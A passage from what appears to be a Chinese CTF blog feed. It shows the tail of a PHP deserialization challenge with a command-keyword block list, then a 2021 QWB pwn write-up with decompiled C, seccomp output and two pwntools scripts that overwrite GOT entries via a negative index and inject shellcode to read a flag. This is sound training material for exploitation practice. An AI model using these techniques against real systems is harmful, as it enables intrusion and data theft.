class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;var;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__invoke&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;show();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;B&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$func&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$arg&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;show&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;variable&quot;&gt;$func&lt;/span&gt; = &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;func;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&amp;#x27;/^[a-z0-9]*$/isD&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;func) || preg_match(&lt;span class=&quot;string&quot;&gt;&amp;#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&amp;#123;|\%|x|\&amp;amp;|\$|\*|\||\&amp;lt;|\&amp;quot;|\&amp;#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;arg)) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;No!No!No!&amp;#x27;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;//There is no code to print flag in flag.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;variable&quot;&gt;$func&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;arg); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__toString&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;show();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&amp;quot;Nice Job!!&amp;quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;pop&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;variable&quot;&gt;$aaa&lt;/span&gt; = unserialize(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;pop&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;variable&quot;&gt;$aaa&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    highlight_file(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;照常先来看入口点，在反序列化后立刻函数式调用了该对象，那么可以触发的就是&lt;code&gt;__invoke&lt;/code&gt;函数。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__invoke&lt;/code&gt;函数内部调用了同类中的&lt;code&gt;show&lt;/code&gt;函数，其中将变量&lt;code&gt;$var&lt;/code&gt;作为字符串打印，那么可以触发&lt;code&gt;__toString&lt;/code&gt;函数。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__toString&lt;/code&gt;函数也调用了同类中的&lt;code&gt;show&lt;/code&gt;函数，包含了&lt;code&gt;flag.php&lt;/code&gt;并且可以控制调用的函数名和第二个参数。&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>2021强网杯pwn复现</title>
    <link href="http://example.com/2021/10/09/2021%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2021/10/09/2021%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-10-08T16:55:04.000Z</published>
    <updated>2021-10-09T07:06:57.660Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><ul><li>参考链接：<a href="https://a1ex.online/2021/06/25/2021-QWB%E9%A2%98%E8%A7%A3/">https://a1ex.online/2021/06/25/2021-QWB%E9%A2%98%E8%A7%A3/</a></li></ul><h3 id="强网先锋-orw"><a href="#强网先锋-orw" class="headerlink" title="[强网先锋]orw"></a>[强网先锋]orw</h3><ul><li>查看程序，基本全是7的权限，所以说shellcode往哪里写都可以：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">secc@ubuntu:~/Desktop$ checksec pwn</span><br><span class="line">[*] &#x27;/home/secc/Desktop/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><ul><li>临时修改共享库可以使用如下命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD=/home/secc/Desktop/libseccomp.so.0</span><br></pre></td></tr></table></figure><ul><li>查看沙盒，发现限制了只能使用<code>open</code>、<code>read</code>、<code>write</code>函数，这道题应该是个orw：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">secc@ubuntu:~/Desktop$ seccomp-tools dump ./pwn</span><br><span class="line">..#######..##......##.########.</span><br><span class="line">.##.....##.##..##..##.##.....##</span><br><span class="line">.##.....##.##..##..##.##.....##</span><br><span class="line">.##.....##.##..##..##.########.</span><br><span class="line">.##..##.##.##..##..##.##.....##</span><br><span class="line">.##....##..##..##..##.##.....##</span><br><span class="line">..#####.##..###..###..########.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">It&#x27;s easy .Just hack for fun~!</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><ul><li>反编译程序，是一道菜单题，只有add和free两个函数。首先来看看函数，这里没有限制索引为负数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_E44</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( qword_202130 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">    v1 = sub_DFA();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    v2 = sub_DFA();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">8</span> &amp;&amp; v1 &lt;= <span class="number">1</span> )<span class="comment">// 只限制了索引小于1，存在数组越界</span></span><br><span class="line">    &#123;</span><br><span class="line">      qword_2020E0[v1] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">      <span class="keyword">if</span> ( !qword_2020E0[v1] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">      sub_D8E(qword_2020E0[v1], v2);</span><br><span class="line">      ++qword_202130;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> qword_202130;</span><br></pre></td></tr></table></figure><ul><li>free函数比较正常：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_F8E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  result = qword_202138;</span><br><span class="line">  <span class="keyword">if</span> ( qword_202138 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">    v1 = sub_DFA();</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_2020E0[v1]);</span><br><span class="line">    qword_2020E0[v1] = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">return</span> ++qword_202138;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>myread函数，存在任意长度写：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_D8E</span><span class="params">(_BYTE *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  buf = a1;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1uLL</span>);<span class="comment">// 首先读入一个字节，让v4加1，此时v4已经等于1了</span></span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++buf == &amp;a1[a2] )</span><br><span class="line">      <span class="keyword">return</span> v4;<span class="comment">// 如果伪造v4为0的话，这里的判断永远不会成立，所以存在任意长度写</span></span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>思路：</p><ul><li>使用负索引，可以修改got表。</li><li>往got表的libc地址内写入shellcode，最后触发执行。</li></ul></li><li><p>脚本：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;39.105.131.68&#x27;</span>,<span class="number">12354</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">mov rdi, 0x67616c662f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">mov rsi, rdi</span></span><br><span class="line"><span class="string">mov rdi, rax</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;-25&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;init-pwndbg\nb *$rebase(0x0000E90)&#x27;)</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;&#x27;</span>) <span class="comment"># 填0也可以</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">sh.sendline(asm(shellcode))</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><ul><li>另一种思路：<ul><li>改写atoi为<code>jmp rdi</code>，这样就可以利用atoi的缓冲区写入shellcode。</li><li>通过16字节的shellcode写入更大的shellcode，完成orw。且可以后一个shellcode可以读入栈中，使用rbp寄存器。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">cho</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;choice &gt;&gt;&#x27;</span>, <span class="built_in">str</span>(cho))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">   choice(<span class="number">1</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;content&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">   choice(<span class="number">4</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov dl, 0x80</span></span><br><span class="line"><span class="string">mov rsi, rbp</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rbp</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">8</span>, <span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">pause()</span><br><span class="line">add(-<span class="number">14</span>, <span class="number">8</span>, asm(<span class="string">&#x27;jmp rdi&#x27;</span>)) <span class="comment"># atoi</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.pushstr(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;rsp&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">sh.send(asm(shellcode))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="强网先锋-no-output"><a href="#强网先锋-no-output" class="headerlink" title="[强网先锋]no_output"></a>[强网先锋]no_output</h3><ul><li>使用IDA反编译程序：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8049424</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">48</span>]; <span class="comment">// [esp+2Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_804930B();</span><br><span class="line">  v3 = <span class="string">&quot;tell me some thing&quot;</span>;</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>u);</span><br><span class="line">  v3 = <span class="string">&quot;Tell me your name:\n&quot;</span>;</span><br><span class="line">  read(<span class="number">0</span>, src, <span class="number">0x20</span>u);</span><br><span class="line">  sub_80493EC(src);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  v3 = <span class="string">&quot;now give you the flag\n&quot;</span>;</span><br><span class="line">  read(unk_804C080, src, <span class="number">0x10</span>u);<span class="comment">// 读取本地文件中的字符串</span></span><br><span class="line">  result = sub_8049385(src, off_804C034);<span class="comment">// 字符串比较，off_804C034为hello_boy</span></span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> sub_8049269();<span class="comment">// 比较成功后进入函数</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>看一下<code>sub_804930B</code>初始化函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804930B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// 